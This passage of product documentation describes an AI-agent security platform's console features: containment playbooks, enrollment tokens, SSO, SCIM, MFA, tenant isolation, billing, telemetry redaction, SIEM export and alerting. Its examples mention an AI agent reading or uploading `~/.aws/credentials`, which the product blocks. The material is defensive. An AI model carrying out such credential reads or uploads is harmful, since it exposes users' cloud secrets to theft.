- The **scheduled summary** (weekly on Monday or monthly on the 1st, 06:00 UTC) goes to
  owners, or owners and admins, with counts only; approver identities are left out.
- *Print / save as PDF* produces a self-contained A4 edition; signed evidence remains the
  [compliance evidence report](#compliance-evidence-report).

**How to use.** Open **Governance**, pick a window, and enable the summary under
**Scheduled summary**. Details: [ai-governance-frameworks.md](../../../ai-governance-frameworks.md).

**Example.** The 30-day scorecard shows 42 approval requests, a median decision time of four
minutes, one approver marked *Review pattern*, and EU AI Act coverage limited by a retention
period shorter than six months.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Free, Team, Business, Enterprise (dashboard) | Cloud, On-prem, Air-gapped (summary needs a mail transport) | Web console |

**Limitations.** The mapping and scorecard *support* obligations; they are not a
certification, audit opinion or legal advice. Coverage is a product view and cannot see
organisational measures. Offline, local-mode and unmanaged endpoints are not represented.

### AutoSecOps view and response playbooks

**What it does.** `/autosecops` shows the AutoSecOps runtime security control plane from
inside AIDR. It shows the integration state, runtime state, active agents, open
degradations and a runtime fleet table (agent, runtime or connector, state, health,
last event). Separately, the `response-playbooks` API runs the built-in playbook
`agent_containment_v1` against an enrolled agent.

**Why it matters.** When an incident is confirmed, a responder needs a controlled,
audited way to contain one agent. Ad-hoc scripts do not give that.

**How it works.** The page calls the `autosecops-runtime` function. If the bridge is
unavailable it shows an error and no synthetic or cached data. The playbook queues
`agent_pause` first. It queues `network_isolate` only after the fleet response worker
records verified success of the first step. Only a persisted `succeeded` result advances
the run. A failure, expiry or uncertain result stops it (`partial` if an earlier step
succeeded).

**How to use.** An owner or admin with an AAL2 session sends:
```json
{ "action": "start", "tenant_id": "<tenant>", "agent_id": "<agent>",
  "incident_reference": "<uuid>", "playbook_id": "agent_containment_v1",
  "reason": "Contain the confirmed incident", "idempotency_key": "incident-2026-0001",
  "ttl_seconds": 300 }
```
Read progress with `{"action":"status","tenant_id":"<tenant>","run_id":"<run>"}`.

**Example.** The run pauses the agent. The endpoint worker verifies the host state and
reports success, so `network_isolate` is queued. If the isolation adapter is missing on
that OS, the run ends `partial`.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Not a separate catalog line | Cloud, On-prem (needs the AutoSecOps integration and endpoint worker) | Web console; endpoint adapters vary by OS |

**Limitations.** One built-in playbook. No scripts, arbitrary commands, credential
revocation or external SOAR actions. `incident_reference` is stored but not looked up.
Nothing here proves OS attestation or customer endpoint permissions.

### API keys and enrollment tokens

**What it does.** `/api-keys` issues and revokes tenant **API keys** for manual setups,
Browser Guard and support. It also issues **enrollment tokens**, which are one-time,
short-lived credentials an agent exchanges for its own key.

**Why it matters.** Unattended hosts such as CI runners cannot complete a browser
approval. They need a scoped, expiring credential that is useless once consumed.

**How it works.** Plaintext is shown once. Only SHA-256 hashes are stored. Enrollment
tokens default to 24 hours (`AIDR_ENROLLTOKEN_DEFAULT_TTL_HOURS`) and may be set between
1 hour and 30 days. Creating keys requires an admitted workspace. Owners, admins and
members may create, and viewers may not.

**How to use.** Enter a label (for example `ci-runner`), create the token, and put it in
the endpoint configuration:
```json
{ "mode": "managed",
  "control_plane": { "endpoint": "https://api.aidr.example.com" },
  "auth": { "enrollment_token": "<token>" } }
```
On first contact the connector exchanges it for an API key.

**Example.** A token created at 09:00 with the default lifetime is consumed by a build
agent at 09:05. A second use, or a use after 09:00 the next day, is refused.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans | Cloud, On-prem, Air-gapped | Web console; endpoints on Windows, macOS, Linux |

**Limitations.** A lost key must be revoked and replaced, since it cannot be shown
again. Workspace access must be active before keys or tokens can be created.

### Team, roles and invitations

**What it does.** `/team` manages members and roles (`owner`, `admin`, `member`,
`viewer`), pending invitations and the **Team audit** panel, with CSV and JSON export.
Invitations are accepted at `/enterprise`.

**Why it matters.** Least privilege: viewers can read, members can enroll and edit
policy, and only owners and admins change membership, billing and workspace settings.

**How it works.** The `team-invite` function mints a single-use link that expires after
7 days and binds it to the recipient's email. If a mail provider is configured
(`AIDR_MAIL_PROVIDER=resend` with `RESEND_API_KEY` and `AIDR_MAIL_FROM`), it emails the
link and reports `delivery: "email"`. Otherwise it returns the link for manual sharing
(`delivery: "manual"`). A failed send is reported as `email_delivery: "failed"` with the
link. The link is never logged. Row-level security on `team_members` repeats the role
rules, so the API cannot be used to bypass the page.

**How to use.** On **Team**, enter the email and role and send the invitation. Copy the
link if the response says delivery is manual. Change roles or remove members from the
member list. Use **Prepare CSV export** or **Prepare JSON export** in **Team audit**.

**Example.** An admin invites `sec-reviewer@acme.example` as `viewer`. With no mail
provider configured, the response shows the link, and the admin sends it through the
company chat. The reviewer signs in and gets a read-only view.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans | Cloud, On-prem, Air-gapped (manual links; email needs egress to the mail provider) | Web console |

**Limitations.** Email delivery needs the Resend provider and outbound internet. The
team audit panel shows the latest 1,000 entries. Browser export is capped at 100,000
records or 64 MiB. Use the paginated export API for more.

### Workspace settings: name, retention, closure

**What it does.** `/settings` lets owners and admins rename the workspace and set
**telemetry retention** in days. It lets an owner **close the workspace**. It also
shows your MFA status for this session, appearance settings and links to privacy,
security, terms and support.

**Why it matters.** Retention is a data-protection decision, designed to support
KVKK/GDPR data-minimisation obligations. Closing a workspace must revoke access at once
and delete data on a defined schedule.

**How it works.** The `tenant-settings` function checks the identity barrier and AAL2,
then calls row-locked database functions that write audit records in the same
transaction. Retention accepts 1 to 3,650 days, and new workspaces start at 30. Shortening
retention needs explicit confirmation (`retention_reduction_unconfirmed` otherwise).
Closing reuses the offboarding workflow: API keys, SCIM tokens and delegated credentials
are revoked at once, members lose access, and data is deleted as each retention period
ends. Active legal holds pause deletion.

**How to use.** Open **Settings → Workspace**. Change the name or retention and press
**Save workspace settings**. To close, type the exact workspace name under **Close
workspace** and confirm.

**Example.** An admin lowers retention from 90 to 30 days. The form requires the
checkbox "I understand that shortening retention … makes older telemetry eligible for
permanent deletion." The change is saved and appears in the audit log.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans | Cloud, On-prem, Air-gapped | Web console |

**Limitations.** Commercial and security audit records keep their own minimum
retention. Closure cannot be undone from the console. Backup copies follow the separate
backup retention process and are not deleted by closure.

### Billing and plan

**What it does.** `/billing` shows the tenant's current plan and where it comes from
(card subscription, team record or default). It shows protected agents in use against
admitted agents, admission status and term end, and a **Change plan** picker. It also
lists enterprise order requests and a seats summary (included, extra, allowed,
connected).

**Why it matters.** Procurement and admins need one place that shows what is paid for
and what is in use, and that never turns a pending order into capacity.

**How it works.** The page reads `get_tenant_plan`, a member-only projection that
re-checks membership and the identity barrier. In the default **invoice** build
(`VITE_AIDR_COMMERCIAL_MODE` unset or `invoice`), **Request upgrade** files a
tenant-bound request through `invoice-entitlement`, recorded as `pending_finance`.
Capacity changes only after Finance approves the order and an operator grants the
licence. Card checkout appears only in an explicitly enabled self-service build (see
[payment paths](#payment-paths-invoice-and-card)).

**How to use.** Owners and admins open **Billing**, pick a plan, interval and number of
developer seats (at least the plan minimum), then press **Request upgrade**.

**Example.** An owner requests Business for 30 seats. The page says "This request is
reviewed by Finance and invoiced; it does not change the plan until an approved order is
applied." Admitted agents stay unchanged until then.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans | Cloud; On-prem uses the [signed licence](#signed-offline-licence) instead | Web console |

**Limitations.** Self-service card payment is disabled by default and has not been
accepted against a live provider account. Prices are not published and the page shows
none: every paid plan is quoted through anil@singularityrd.com, and a quote or order
governs. If plan data cannot be read, the page shows no figures rather than guessing.

---

## 4. Identity and access

### Single sign-on: Microsoft Entra ID and SAML 2.0

**What it does.** Users sign in to the console with the methods the deployment enables:
password, magic link, Google, GitHub, **Microsoft Entra ID** (OAuth provider `azure`,
scopes `openid profile email`) and **SAML 2.0** providers ("company SSO"). Entra ID
group ids can be mapped to AIDR roles (`azure-ad-groups`).

**Why it matters.** Central identity means that leavers lose console access when IdP
access is removed, and password policy and conditional access stay with your IdP.

**How it works.** The dashboard server offers only the methods listed in
`AIDR_AUTH_METHODS` (`password`, `magic-link`, `google`, `github`, `azure`; the default is
`password`). SAML buttons come from exactly one of `AIDR_SAML_PROVIDERS` (a JSON list of
up to 8 `{providerId, label}` entries), `AIDR_SAML_PROVIDER_ID` or `AIDR_SAML_DOMAIN`.
Sign-in goes through Supabase Auth. Optional Cloudflare Turnstile captcha is enabled with
`VITE_TURNSTILE_SITE_KEY` and the Auth captcha settings.

**How to use.** Set `AIDR_AUTH_METHODS=password,azure` and configure the Entra
application in Auth. For SAML, register the IdP in Auth and set
`AIDR_SAML_PROVIDERS='[{"providerId":"<uuid>","label":"Acme SSO"}]'`. On Helm use
`dashboard.authMethods` and `dashboard.saml.*`.

**Example.** A user presses **Acme SSO**, authenticates at the corporate IdP and lands on
`/dashboard` with the role mapped from their group.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Entra ID SSO: Team, Business, Enterprise (`entra_sso`). SAML is not a separate catalog line; agree it in the quote. | Cloud, On-prem; Air-gapped only if the IdP is reachable inside the isolated network | Web console |

**Limitations.** Cloud signup is closed by default (`AIDR_SIGNUP_MODE=closed`), and the
self-hosted baseline disables signup. Do not switch on "SAML required" provider policy
until the documented dual-owner cutover and rollback procedure is complete.

### SCIM directory provisioning

**What it does.** `/scim` (**Directory provisioning**, owners only) issues SCIM 2.0
bearer credentials and maps immutable IdP group ids to AIDR roles. The IdP then
provisions users and groups at `https://<api-host>/functions/v1/scim/v2` (`/Users`,
`/Groups`).

**Why it matters.** Joiner, mover and leaver changes flow from your directory, so
console access follows HR state without manual clean-up.

**How it works.** New credentials expire after 90 days by default. Rotation keeps the
previous credential active until you verify the replacement and revoke the old one.
Mappings use the exact `Group.externalId`. Display names and user metadata never grant
roles, and SCIM can never grant `owner`.

**How to use.** Under **Provisioning credentials**, enter a label, create the credential
and copy it once. Configure the SCIM app in Entra ID or your IdP with the base URL and
the token. Add group mappings under **Group-to-role mappings**.

**Example.** Group `8c1e…` is mapped to `member`. When HR adds a developer to that
group, the IdP creates the user, who gets the `member` role. Removing them revokes
access.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Business, Enterprise (`scim`) | Cloud, On-prem, Air-gapped (IdP must reach the API) | Any SCIM 2.0 client; web console |

**Limitations.** SCIM provisioning does not enforce SSO. The page is available to
active owners only.

### Multi-factor authentication, recovery and session revocation

**What it does.** The console supports TOTP MFA. Sensitive changes need an
**AAL2** session: workspace settings, DLP policy, discovery credentials, playbooks and
every operator action. A tenant policy can require MFA for all members. Users can
recover through password reset or self-issued **break-glass recovery codes**
(`/auth/recover`), and every session can be revoked immediately.

**Why it matters.** A stolen password alone must not let an attacker weaken policy or
close a workspace. A compromised session must be killable immediately, not at token
expiry.

**How it works.** The `identity-security` function handles `status`, `set_policy`
(`require_mfa`, `break_glass_enabled`), `revoke_sessions`, `rotate_recovery_codes`,
password recovery and `break_glass_recover`. The **identity barrier**
(`checkIdentityBarrier`) runs before every privileged Edge Function read or write. It
rejects sessions issued before a revocation and enforces the tenant's MFA and SAML
policy. If the policy row cannot be read, the request is refused. Recovery codes are
returned once and stored as hashes. A user can issue them only for themselves, from an
AAL2 session, when the tenant enables break-glass.

**How to use.** **Settings → Profile** shows "Verified for this session (AAL2)" or
offers **Set up or verify MFA**. Tenant MFA policy is set through the
`identity-security` API (`set_policy`).

**Example.** An admin at AAL1 tries to shorten retention. The console sends them to
**Verify with authenticator**, and after TOTP the change goes through.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans | Cloud, On-prem, Air-gapped | Any TOTP authenticator app; web console |

**Limitations.** The dashboard has no toggle for the tenant MFA policy yet; it is set
through the API. Auth email (password recovery) needs SMTP settings on the deployment.

### Device-code enrollment

**What it does.** An endpoint enrolls with a short code instead of a copied key. The
agent prints a code and a URL, a signed-in user approves it on `/verify`, and the
endpoint receives a signed, tenant-bound `managed.json`.

**Why it matters.** No long-lived secret passes through chat or email, and every
enrollment is tied to a named approver and tenant.

**How it works.** It follows the RFC 8628 device flow through three functions:
`device-start`, `device-verify` and `device-poll`. Codes live 10 minutes
(`AIDR_DEVICE_TTL_MINUTES`) and are single-use. The poll interval is 3 seconds
(`AIDR_DEVICE_POLL_INTERVAL_SECONDS`), and a `slow_down` answer raises it by 5 seconds.
The unauthenticated `device-start` route must sit behind the trusted ingress signer
(`deploy/ingress/device-start.mjs`), which signs the client IP with HMAC. Without the
signer the function refuses requests. Enrollment also checks the tenant's admitted
capacity.

**How to use.** Install the connector in managed mode and start the agent. Open the URL
it prints, sign in, enter the code, choose the team, and approve. Restart the agent.

**Example.** The agent prints the eight-character code `K7MPQ2XR` and a link to
`https://aidr.example.com/verify`. The developer picks **Team receiving this device** and
approves within 10 minutes. The agent caches its managed state under
`~/.singularity-aidr/managed.json` and starts reporting.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans | Cloud, On-prem (Compose with the signer; on Helm deploy the signer separately or use enrollment tokens), Air-gapped | Connectors on Windows, macOS, Linux |

**Limitations.** Device authorization needs network access to the control plane. A
code or approval alone does not prove the host loaded the connector. Use host checks.

---

## 5. Multi-tenancy and isolation

### Tenant isolation with row-level security and the identity barrier

**What it does.** Every customer is a **tenant** (a team workspace). Every tenant table
enforces row-level security through `app.is_tenant_member(tenant_id)` and role-aware
variants, so a user can read only rows of workspaces where they hold an active,
unexpired membership in an active tenant.

**Why it matters.** In a shared SaaS database, one missing `WHERE tenant_id = …` would
expose another customer's telemetry. RLS makes the database itself refuse it.

**How it works.** Policies live in the migrations (`20260805000000_hybrid_tenancy.sql`,
`20260912000019_tenant_lifecycle_rls.sql`, later hardening migrations). Browser roles
never get anonymous writes. Service-role Edge Functions bypass RLS by design, so each one
re-checks membership, tenant status and the identity barrier before any privileged read
or mutation, and refuses the request if a check cannot be completed. Per-tenant rate
limits and storage and queue quotas bound shared resources. API keys, enrollment tokens,
SCIM and collector credentials are stored as hashes.

**How to use.** Nothing to configure: isolation is part of the schema in every
deployment. Use one tenant per customer or business unit.

**Example.** A member of tenant A calls the REST API for tenant B's `events`. The query
returns no rows. An Edge Function call for tenant B returns `403`.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans | Cloud, On-prem, Air-gapped | n/a |

**Limitations.** Isolation is logical, in one database. On-prem gives you a physically
separate installation. The customer's database administrators can see all tenants of
their own installation.

---

## 6. Plans, trial and admission

### Plan catalog and plan x feature matrix

**What it does.** `public.plans` (migration `20260925000010_plan_catalog.sql`) is the one
source of plans, seat minimums, deployment options, list retention terms and feature
keys. The public plans page renders a static mirror that a drift test keeps identical.

**Why it matters.** Sales, the plans page and the billing page all describe the same
editions.

**How it works.** A catalog row never grants anything. Capacity changes only through
the audited admission paths below. Signed-in users can read active rows, and only
migrations write them.

**Plan x feature matrix** (pricing is by quote through anil@singularityrd.com; the quote or
order governs):

| | Free | Team | Business | Enterprise |
| --- | --- | --- | --- | --- |
| Minimum | 1 agent | 3 developers | 25 developers | By agreement |
| Agents per seat | 1 | 1 | 1 | 1 |
| Deployment | Cloud | Cloud | Cloud, On-prem | On-prem, Air-gapped |
| List event retention | 7 days | 90 days | 365 days | Contractual |
| Purchase | Sign up | Self-serve card when enabled, otherwise invoice | Sales-assisted, invoice | Sales-assisted, invoice |
| Local detection engine (`local_detection`) | Yes | Yes | Yes | Yes |
| Control-plane dashboard (`dashboard`), including events, incidents, agents, policies, DLP editor, API keys, team, settings, billing | Yes | Yes | Yes | Yes |
| Browser Privacy Guard (`browser_privacy_guard`) | - | Yes | Yes | Yes |
| Microsoft Entra ID SSO (`entra_sso`) | - | Yes | Yes | Yes |
| SIEM export (`siem_export`) | - | - | Yes | Yes |
| SCIM provisioning (`scim`) | - | - | Yes | Yes |
| AI security posture (`ai_security_posture`) | - | - | Yes | Yes |
| Air-gapped deployment (`air_gapped_deployment`) | - | - | - | Yes |
| Dedicated support (`dedicated_support`) | - | - | - | Yes |

Local detection runs on every endpoint **with or without** any plan or account.

**How to use.** See the **Billing** page, or query `public.plans` as a signed-in user.
For pricing and a quote, contact anil@singularityrd.com.

**Example.** A 40-developer company on Business is admitted 40 protected agents (one agent
per developer seat); the price is set in the quote.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| n/a | Catalog present in Cloud and On-prem databases | n/a |

**Limitations.** A catalog feature still needs its own release acceptance before it is
sold as supported. The software does not gate features by plan today. The list retention
term is commercial, and the effective retention is the workspace setting.

### Trial and tenant admission

**What it does.** **Admission** decides whether a tenant may enroll agents and ingest
events, and how many. It can come from a **verified trial** (1 seat, exactly 14 days),
an **operator licence** (from an approved invoice, order or signed on-prem licence) or
a **card subscription** (self-service builds only).

**Why it matters.** It separates "someone paid" or "someone signed up" from "this tenant
may put endpoints on the platform", and it makes each change an audited act.

**How it works.** The deployment has one admission mode (`cloud`, `onprem` or `pilot`),
set once by an operator. `start_verified_trial` requires cloud mode, an owner, recorded
acceptance of the current Terms and Privacy versions, and a user who has never had a
trial. The trial claim in Auth metadata is immutable. Ingest and enrollment check
`tenant_admission_capacity`. A tenant with no admitted capacity rejects new agents.

**How to use.** Cloud customers start the trial on **Connect**. Paid terms arrive
through the paths below. The Billing page shows admission status and term end.

**Example.** On day 15 of a trial, admission ends. New enrollments and event ingest are
refused, and the Billing page says "This tenant has no admitted protected-agent
capacity." Endpoints keep enforcing locally.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Trial: cloud sign-up; licences: all paid plans | Trial: Cloud. Licences: Cloud, On-prem, Air-gapped | n/a |

**Limitations.** Revocation reaches a disconnected endpoint only when it reconnects.
Paid seats alone never admit a tenant.

### Payment paths: invoice and card

**What it does.** There are two channels. **Invoice** (the default) handles enterprise
and on-prem orders. **Card subscription** through Stripe is for cloud Team and Business,
and only in builds that explicitly enable it.

**Why it matters.** A browser request or an unverified webhook must never create paid
capacity.

**How it works.**
- *Invoice:* `invoice-entitlement` stores an idempotent, tenant-bound request as
  `pending_finance` in `enterprise_invoice_orders`, after session and MFA checks. An
  audited Finance approval records the paid decision. An admission operator then grants
  a finite licence with `grant_licensed_tenant_admission`.
- *Card:* active only when `AIDR_ENABLE_LEGACY_SELF_SERVICE_BILLING=true`,
  `AIDR_BILLING_PROVIDER=stripe` and `AIDR_STRIPE_PRICE_MAP` are set on the server and
  the dashboard is built with `VITE_AIDR_COMMERCIAL_MODE=self-service`. The
  `stripe-webhook` function maps a signed subscription to a plan and calls
  `apply_stripe_plan_subscription`. That function grants a licence bound to
  `stripe:<subscription id>` only for an active, automatically collected subscription
  that meets the plan minimum. The licence expires at the paid period end. The function
  never overrides an operator licence or revocation, holds `trialing`, `past_due` and
  similar states, and writes an `admin_audit_logs` row for every decision.

**How to use.** Default builds need no setup beyond the sales contact settings
(`VITE_SALES_URL` or `VITE_SALES_EMAIL`). Card payment is an operator decision that
needs Finance approval.

**Example.** A Stripe `customer.subscription.updated` event with status `past_due`
records the status and grants nothing (`billing.stripe_plan_status_recorded`).

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Invoice: all paid plans. Card: Team, Business (`self_serve` is true only for Free and Team) | Invoice: Cloud and On-prem. Card: Cloud only | n/a |

**Limitations.** The card path has local signature and replay tests but no accepted live
provider account, price, portal, refund or reconciliation. Paddle helpers are legacy and
stay disabled.

### Operator administration (operator-admin)

**What it does.** Platform operators, meaning the people who run a control plane (not
tenant owners), use the `operator-admin` function or its CLI
`scripts/operator-admin.mjs`. They fix the admission mode, record approved Terms and
Privacy documents (URL and SHA-256), grant and revoke licences, list tenants and read
per-tenant usage.

**Why it matters.** Licence grants are money-relevant and security-relevant. They must be
done by named, MFA-verified people with a receipt, never by a script holding the
service-role key.

**How it works.** A request passes only if every check passes: a valid access token, the
identity barrier, an active unexpired row in `public.platform_operators` (30 days by
default), AAL2, and a bounded 16 KiB body. Inside the SQL transaction the operator row is
checked again, the existing RPC is called, and an actor-attributed `admin_audit_logs`
receipt is written. If any step fails, the whole change rolls back. Licence grants also
require an unexpired `admission_operators` row for that tenant, held by someone who is
not a member of the tenant (separation of duties).

**How to use.** The CLI reads credentials only from the environment
(`AIDR_SUPABASE_URL`, `SUPABASE_ANON_KEY`, and either `AIDR_OPERATOR_ACCESS_TOKEN` or
`AIDR_OPERATOR_EMAIL` + `AIDR_OPERATOR_PASSWORD` + `AIDR_OPERATOR_TOTP_CODE`):
```bash
node scripts/operator-admin.mjs mode onprem
node scripts/operator-admin.mjs grant --tenant <tenant-uuid> --plan business --seats 30 \
  --expires-at 2027-09-30T23:59:59Z --reference PO-2026-001
node scripts/operator-admin.mjs usage --tenant <tenant-uuid>
node scripts/operator-admin.mjs revoke --tenant <tenant-uuid> --reason "contract ended"
```
Add `--dry-run` to print the request without sending it.

**Example.** An operator without TOTP step-up runs `grant`. The CLI exits `1` and prints
`403 mfa_required`. After step-up the grant succeeds and writes
`operator.license_granted`.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Operator tool, not a plan feature | Cloud (SingularityRD operators), On-prem and Air-gapped (customer operators) | Node on the operator workstation |

**Limitations.** Browser code never calls this function, and no agent or MCP tool can
reach it. Operator rows are added only through a database-administrator change process.

---

## 7. Telemetry and its privacy

### Redacted, counts-only telemetry

**What it does.** Enrolled endpoints send the control plane **minimised** events: agent
verdicts, incidents, plugin and posture findings, policy cache receipts and Browser
Guard `privacy_scan` counts.

**Why it matters.** A security product must not become a data-leak channel. Customers
need to know exactly what reaches the server.

**How it works.**
- Agent verdict events cross a mandatory credential-redaction boundary on the endpoint.
  The default `control_plane.redact_mode: "hash"` replaces tool summaries and artifacts
  with SHA-256 digests. `"full"` omits them. `"none"` is for debugging only and still
  strips bearer tokens, API keys, JWTs and URL credentials.
- Browser Guard sends site, action, channel and per-type counts only. There is no text,
  masked text, matched value or page URL.
- Posture uploads carry ids, severities, versions and digests only.
- The server enforces a fixed allow-list of event types in `supabase/functions/ingest`
  and drops unknown fields.
- Not sent: source code, file contents and prompts. Optional reputation lookups, version
  checks and diagnostics are separate opt-in flows.
- On-prem, telemetry goes to your control plane, not to SingularityRD.

**How to use.** Choose `redact_mode` in the endpoint configuration. Keep
`send_clean_verdicts: false` unless you need `allow` volume. See
[privacy.md](../../../privacy.md) for every outbound path.

**Example.** An agent blocks `cat ~/.aws/credentials`. The event shows tool `Bash`,
verdict `deny` and a digest in place of the path.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans | Cloud, On-prem, Air-gapped (no telemetry in Local mode) | Enrolled connectors and Browser Guard |

**Limitations.** This is an engineering data-flow statement, not a DPA. Each customer
must record destinations, region, retention and subprocessors. The design is intended to
support KVKK/GDPR obligations. It is not a certification.

---

## 8. Audit export and SIEM delivery

### Audit export (CSV and JSON)

**What it does.** Tenant members export the tenant audit log as CSV or JSON from
**Team → Team audit**, or page through it with the `audit-export` API.

**Why it matters.** Auditors and incident responders need a complete, tamper-evident copy
of who did what in the console.

**How it works.** Each page holds up to 500 rows, is written to the private
`aidr-audit-exports` bucket and is handed out as a signed download valid for 60 seconds,
with its SHA-256 and a signed `next_cursor`. Follow the cursor until `complete` is
`true`. Every page is bound to one snapshot. An active **legal hold** blocks exports
(`409 legal_hold_active`), and an unreadable hold row fails closed.

**How to use.** On **Team**, press **Prepare CSV export** or **Prepare JSON export**,
then **Save audit export**.

**Example.** An export of 1,320 records arrives as three pages. The console checks each
page's digest and snapshot and joins them into one file.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans (dashboard) | Cloud, On-prem, Air-gapped | Web console |

**Limitations.** The export covers the audit log only. Privacy scans and verdict events
are not part of it. Clean-up of storage objects is an operational follow-up.

### SIEM delivery

**What it does.** A delivery worker forwards AIDR incident events in the portable
`aidr.siem.event/v1` schema to **Splunk HEC**, **Microsoft Sentinel**
(DCR-based ingestion), **Elastic** or a **generic webhook**.

**Why it matters.** The SOC works in its SIEM. AIDR blocks and approval requests should
sit next to EDR and identity alerts.

**How it works.** The worker drains durable queues with **at-least-once** delivery.
Each event has a stable `event_id`, and idempotency headers are sent where supported
(Elastic deduplicates by document id). "Delivered" means the provider's receipt contract
was met: Splunk success, Sentinel HTTP 204, an accepted Elastic item or a correlated
webhook echo of `x-aidr-event-id`. When capacity is exhausted, new entries are refused
rather than dropped silently. On self-hosted Compose, `aidr-siem-delivery.timer` runs
every minute.

**How to use.** Write a protected SIEM configuration
(`SINGULARITY_AIDR_SIEM_CONFIG_PATH`, state file under `/var/lib/aidr-siem`), then run
`sudo sh /srv/aidr/maintenance/install-systemd.sh`. The installer refuses to activate if
a key, queue or configuration is missing. See
[deploy/maintenance](../../../../deploy/maintenance/README.md).

**Example.** An endpoint `deny` becomes a Sentinel record with the same `event_id`. A
retry after a crash produces a duplicate that the SOC rule deduplicates on `event_id`.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| Business, Enterprise (`siem_export`) | On-prem Compose (systemd timer), Air-gapped (internal SIEM), Cloud (listed for the hosted service); not yet a Helm CronJob | Linux host with systemd |

**Limitations.** Not exactly-once. Webhooks do not require authentication, so do not
point an unauthenticated webhook at an internet-reachable receiver. There is no mTLS or
request signing. "Delivered" does not prove indexing or alerting downstream.

### Compliance evidence report

**What it does.** Owners and admins generate a tenant-scoped JSON report for a chosen
period (up to 366 days) from **Compliance** (`/compliance`) or the `compliance-report`
API. It gathers the evidence security and DPO teams are usually asked for: tenant
profile and retention settings, protection coverage by runtime, Browser Guard
masked/warned/blocked counts by entity type, AI site and day, agent DLP decisions,
policy versions and digests, MFA/SSO/SCIM state with the owner/admin list, incidents,
AI security posture (CVE severities, MCP risks), the data-flow and subprocessor
inventory, and retention, legal-hold, offboarding and export clean-up evidence.

**Why it matters.** KVKK and GDPR accountability work needs the same facts every
quarter. The report is designed to support that work with one verifiable document. It is
not a certification and does not state that anyone is compliant.

**How it works.** A service-role SQL function aggregates counts, enums, identifiers,
timestamps and SHA-256 digests only; the Edge Function projects the result through a
declarative schema that drops anything else and refuses malformed evidence. The report
carries the SHA-256 of its canonical JSON and, when the deployment has a compliance
signing key, an Ed25519 signature. Each issued report is written to the admin audit log
(`compliance_report.generated`) before it is returned. Generation requires an AAL2
session, passes the identity barrier, is rate limited (3 per minute per user) and fails
closed at every step.

**How to use.** Open **Compliance**, pick a period and press **Generate report**. Then
download the JSON (the authoritative artifact), a ZIP of CSV files (one per section
table), or a printable report in English or Turkish (**Print / save as PDF**). Auditors
verify the JSON offline:

```bash
aidr compliance verify report.json --public-key issuer.pem --require-signature
```

**Example.** A DPO generates the last 90 days, attaches the PDF to the quarterly access
review and gives the auditor the JSON and the operator's public key. The auditor's
`aidr compliance verify` prints `VERIFIED`; changing a single count makes it exit 2.

**Availability.**

| Plan | Deployment | Platforms / OS |
| --- | --- | --- |
| All plans (dashboard) | Cloud, On-prem, Air-gapped (signing key set by hand on-prem) | Web console; `aidr` CLI on Linux, macOS, Windows for verification |

**Limitations.** Counts cover only telemetry that reached the control plane and is still
within retention. Policy bodies, prompt text and hold reasons are deliberately excluded.
The data-flow matrix is the product's engineering inventory with open `unknown` values.
CSV and printable editions are derived and unsigned. Without a signing key the report is
hash-only. See [docs/compliance-report.md](../../../compliance-report.md) for what each
section proves and does not prove.

### Alert integrations: Slack, Teams, signed webhooks and e-mail

**What it does.** Under **Settings → Notifications**, workspace owners and administrators
send real-time alerts to **Slack** (incoming webhook, Block Kit message), **Microsoft
Teams** (workflow webhook, Adaptive Card), a **signed HTTPS webhook** (JSON schema
`aidr.notification.v1`) or **e-mail** (1 to 10 recipients). Each channel chooses its
events: new incidents at or above a minimum severity, critical runtime denies, actions
awaiting out-of-band approval, and spikes of blocked Browser Guard prompts (for example 10
blocked sends within 15 minutes).

**Why it matters.** A blocked exfiltration attempt or an approval request is useful only
if someone sees it in time. Teams without a SIEM, or with a SIEM that nobody watches at
night, still get the alert where they already work.

**How it works.** The event and its alert are written in the **same database
transaction**: an `AFTER INSERT` trigger on the telemetry table queues one delivery per
matching channel (transactional outbox), so an alert exists if and only if the event was
stored. A dispatcher runs every minute, leases due deliveries, and sends them with a 10 s
timeout, **exponential backoff** (8 attempts from 30 s up to 1 h) and a stable
**idempotency key** (the delivery id). Generic webhooks are signed with
`X-AIDR-Signature: t=<ts>,v1=<HMAC-SHA256>`; a Node.js and a Python verification snippet
are in [the notification contract](../../../contracts/notifications.md). Alerts carry
**identifiers, severity, category and counts only**, plus a deep link into the console;
never prompts, commands, paths or matched values. Destinations are **write-only**: they
are encrypted at rest (AES-256-GCM, bound to the tenant and channel) and never shown
again; the console shows only the host and a short digest. Before every send the
webhook host is resolved and any private, link-local or cloud-metadata address is
refused (**SSRF protection**); Slack and Teams URLs must be on the provider's webhook
hosts, and redirects are never followed. Every change and test send needs MFA (AAL2), is
rate limited and is audited.

**How to use.** Settings → Notifications → **Add a channel**: pick the type, paste the
webhook URL (for a signed webhook press **Generate**, copy the secret into your receiver),
choose the events and save. Press **Send test** to see the receiver's real answer, and
use **Disable**, **Edit events** or **Delete** later. **Recent deliveries** lists each
attempt with its status and error code. Operators schedule the dispatcher once: pg_cron
on Supabase Cloud, `install-systemd.sh --with-notifications` on Compose,
`notifications.dispatcher.enabled=true` on Helm (see
[control plane](../../../control-plane.md#alert-integrations-slack-teams-webhooks-e-mail)).

**Example.** A Claude Code agent tries to upload `~/.aws/credentials`; the connector
denies it with a critical rule. Within a minute the SOC Slack channel shows "Critical
agent action blocked" with the rule id, agent id and an **Open in AIDR** button; the
